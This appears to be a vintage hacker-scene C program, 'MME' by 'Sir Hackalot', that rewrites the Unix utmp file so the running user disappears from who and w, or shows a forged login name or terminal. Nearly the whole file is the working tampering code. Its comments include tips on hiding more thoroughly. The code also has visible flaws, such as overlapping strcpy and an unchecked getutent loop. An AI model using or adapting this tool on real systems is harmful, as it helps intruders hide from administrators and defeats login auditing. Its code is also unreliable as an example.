/* MME - MakeME, Version 1.00 for SySV / Source Compatible machines   
         MME will allow you to remove yerself from the UTMP file, change
         what name appears for you in UTMP, or change what TTY you appear
         to be on.
         Read MME.DOC for an explanation of this.  you NEED to read it.

If you modify this program or incorporate some of these routines into
another program, please somewhere in the program tell where you got
them from.. namely, put in some credits to me & This program , so
you don't "playgerize".  It makes me mad when someone modifies someone
else's work then pawns it off as their own original piece.  The credits
can even be in a comment somewhere in the source instead of visual to
the user. 

syntax:
mme
mme login_name
mme login_name new_tty

in order to change tty name, you must first supply a login name
then a ttyname.

You MUST have write perms to /etc/utmp to modify the main utmp file.
See MME.DOC for more details, like how to test this when you are not root...
*/

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <utmp.h>
#include <sys/stat.h>

char *mytty; /* For an exact match of ut_line */
char *backup_utmp = "cp /var/run/utmp /tmp/utmp.bak";
struct utmp *user;

main(argc,argv)
int argc;
char *argv[];
{
  int good= 0,cnt = 0,start = 1,cn = 0, cl = 0,index = 0;
  char err[80];
  
  if (argc >= 2) 
    cn = 1;
  
  if (argc == 3) 
    cl = 1;
  
  system(backup_utmp);
  printf("Welcome to MME 1.00 By Sir Hackalot\n");
  printf("Another PHAZESOFT Productions\n");
  printf("Status: ");
  
  if (cn == 1) 
    printf("Changing your login to %s\n",argv[1]);
   
  if (cl == 1) 
    printf("Changing your tty   to %s\n",argv[2]);
        
  if (cl == 0 && cn == 0) 
    printf("Removing you from utmp\n");
    
  utmpname("/var/run/utmp");

/* The Below Section finds OUR entry, even if more than 1 of the same name
   of us is logged on.  It finds YOUR tty, looks in utmp until it finds
   your tty, then "cnt" holds your index number */
        
  mytty = strrchr(ttyname(0), '/'); /* Goto the last "/" */
  strcpy(mytty, ++mytty); /* Make a string starting one pos greater */
        
  while (good != 1) 
  {
    user = getutent();
    cnt++;
    
    if (strcmp(user->ut_line,mytty) == 0) 
      good = 1;
  }
  
  utmpname("/var/run/utmp"); /* Reset file pointer */
        
  for(start=0; start<cnt; start++) 
  {
      user = getutent(); /* Move the file pointer to where we are */
  }
  
  /* Below: If we did not supply a command line arg to change name, etc,
     make us invisible from WHO.  WHO only displays USER_PROCESS 
     types, as does "w", "whodo" and all who variations.  You WILL
     be seen if they do who -l (or one some systems -L)
     if we did supply an argument make SURE we DO show up. */
  
  if (argc == 1)  
    user->ut_type = LOGIN_PROCESS; /* Become invisible */
  else 
    user->ut_type = USER_PROCESS;

  /* ABove: You can change it to:
     
     else 
     {
       user->ut_type = LOGIN_PROCESS;
       strcpy(user->ut_name,"LOGIN");
     }
     
     to totally hide your-self.  On some systems, if you do it, it will go
     thru the login process... But that is rare.  AT any-rate, for 
     safety, i left out the strcpy */

  /* Below: If we enterred a new login name, change to that.
     If we enterred a new tty, change to that. */

  if (argc == 2) 
    strcpy(user->ut_name,argv[1]);
    
  if (argc == 3) 
    strcpy(user->ut_line,argv[2]);
    
  pututline(user); /* Rewrite our new info */
  endutent(); /* Tell the utmp functions we are through */
  
  printf("Delete /tmp/utmp.bak if all is well. Else, copy it to /var/run/utmp\n");
}
